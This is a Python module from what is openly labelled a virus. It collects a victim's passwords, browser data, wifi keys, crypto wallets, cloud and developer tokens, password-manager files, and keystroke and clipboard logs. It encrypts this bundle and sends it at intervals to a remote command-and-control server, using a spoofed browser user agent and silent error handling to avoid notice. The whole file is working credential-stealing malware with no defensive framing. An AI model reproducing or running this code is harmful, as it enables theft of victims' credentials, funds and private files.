"""
Virus Data Exfiltration Module
"""
import os
import json
import time
import sys
import urllib.request
import urllib.parse
import hashlib
from virus_config import *
from virus_utils import log_activity, encrypt_data
from virus_data_collection import (
    collect_passwords, collect_sensitive_files, collect_browser_data,
    collect_wifi_passwords, collect_email_configs, collect_database_files,
    collect_crypto_wallets, collect_recent_documents, collect_system_info_comprehensive,
    collect_application_tokens, collect_cloud_storage_configs,
    collect_development_tokens, collect_password_manager_files,
    collect_all_config_files
)

def exfiltrate_data():
    """Send collected data to remote C2 server"""
    if not ENABLE_DATA_EXFILTRATION:
        return
    
    try:
        # Use normalized_data.json (ONLY FILE - clean, deduplicated, accurate)
        data_file = f"{DATA_DIR}/normalized_data.json"
        
        data_package = {}
        if os.path.exists(data_file):
            try:
                with open(data_file, 'r', encoding='utf-8') as f:
                    data_package = json.load(f)
            except:
                data_package = {}
        
        if 'timestamp' not in data_package:
            data_package['timestamp'] = time.strftime("%Y-%m-%dT%H:%M:%S")
        if 'hostname' not in data_package:
            data_package['hostname'] = os.uname().nodename if hasattr(os, 'uname') else 'unknown'
        if 'user' not in data_package:
            data_package['user'] = os.getenv('USER', 'unknown')
        
        if 'system' not in data_package:
            data_package['system'] = {
                'platform': sys.platform,
                'python_version': sys.version,
            }
        
        if 'passwords' not in data_package:
            data_package['passwords'] = collect_passwords()
        if 'sensitive_files' not in data_package:
            data_package['sensitive_files'] = collect_sensitive_files()
        if 'browser_data' not in data_package:
            data_package['browser_data'] = collect_browser_data()
        if 'wifi_passwords' not in data_package:
            data_package['wifi_passwords'] = collect_wifi_passwords()
        if 'email_configs' not in data_package:
            data_package['email_configs'] = collect_email_configs()
        if 'databases' not in data_package:
            data_package['databases'] = collect_database_files()
        if 'crypto_wallets' not in data_package:
            data_package['crypto_wallets'] = collect_crypto_wallets()
        if 'recent_documents' not in data_package:
            data_package['recent_documents'] = collect_recent_documents()
        if 'system_info' not in data_package:
            data_package['system_info'] = collect_system_info_comprehensive()
        
        # Enhanced data collection
        if 'application_tokens' not in data_package:
            data_package['application_tokens'] = collect_application_tokens()
        if 'cloud_storage_configs' not in data_package:
            data_package['cloud_storage_configs'] = collect_cloud_storage_configs()
        if 'development_tokens' not in data_package:
            data_package['development_tokens'] = collect_development_tokens()
        if 'password_manager_files' not in data_package:
            data_package['password_manager_files'] = collect_password_manager_files()
        if 'config_files' not in data_package:
            data_package['config_files'] = collect_all_config_files()
        
        # All logs merged into keyboard_log.txt
        data_package['keyboard_logs'] = []
        data_package['activity_logs'] = []  # Keep for compatibility, but same as keyboard_logs
        data_package['clipboard_history'] = []
        
        # Read merged log file (keyboard_log.txt contains all activity)
        log_file = f"{DATA_DIR}/{LOG_FILE}"
        if os.path.exists(log_file):
            try:
                with open(log_file, 'r', encoding='utf-8') as f:
                    content = f.read()
                    # Both keyboard_logs and activity_logs point to same merged log
                    log_content = content[-10000:] if len(content) > 10000 else content
                    data_package['keyboard_logs'] = log_content
                    data_package['activity_logs'] = log_content  # Same content, merged
            except:
                pass
        
        encrypted_payload = encrypt_data(json.dumps(data_package))
        
        try:
            payload = {
                'data': encrypted_payload,
                'key': hashlib.md5(C2_KEY.encode()).hexdigest(),
                'host': data_package['hostname']
            }
            
            data = urllib.parse.urlencode(payload).encode()
            req = urllib.request.Request(C2_SERVER, data=data, method='POST')
            req.add_header('User-Agent', 'Mozilla/5.0')
            
            with urllib.request.urlopen(req, timeout=10) as response:
                log_activity("EXFILTRATION", f"Data sent successfully: {len(encrypted_payload)} bytes")
        except Exception as e:
            try:
                with open(EXFILTRATION_FILE, 'w') as f:
                    json.dump(data_package, f)
            except:
                pass
    except:
        pass

def exfiltration_worker():
    """Background worker for periodic data exfiltration"""
    while True:
        try:
            if ENABLE_DATA_EXFILTRATION:
                exfiltrate_data()
            time.sleep(EXFILTRATION_INTERVAL)
        except:
            time.sleep(EXFILTRATION_INTERVAL)

